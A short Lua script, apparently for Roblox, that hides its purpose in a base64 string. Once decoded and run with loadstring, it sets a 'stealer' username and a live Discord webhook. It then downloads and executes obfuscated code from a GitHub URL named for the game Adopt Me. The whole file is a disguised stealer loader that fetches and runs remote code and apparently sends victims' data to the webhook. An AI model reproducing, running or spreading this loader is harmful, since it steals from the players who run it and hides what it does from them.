
 -- Obfuscated script
 local encodedScript = "VXNlcm5hbWUgPSAic3RlYWxlcjIyNDIiCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzOTI0MTE0Nzk5ODAxMTQ1NC9GWWJ4bE5kSVJqeHdUT0RnRWJBUHc4YWN2UnBPR0VETEFnQ3Bobmt6aHVPZjBuR1FpdHhaZ3YyRGlBNVhxUkRCeEw1cyIKCiBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hzY3JpcHQyNS9BZG9wdC1NZS9yZWZzL2hlYWRzL21haW4vb2JmdXNjYXRlZC50eHQiLCB0cnVlKSkoKQ=="

 -- Decode function
 local function decode(str)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     str = string.gsub(str, '[^'..b..'=]', '')
     return (str:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
         for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
         return r;
     end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
         if (#x ~= 8) then return '' end
         local c=0
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
 end

 -- Run the decoded script
 loadstring(decode(encodedScript))()
 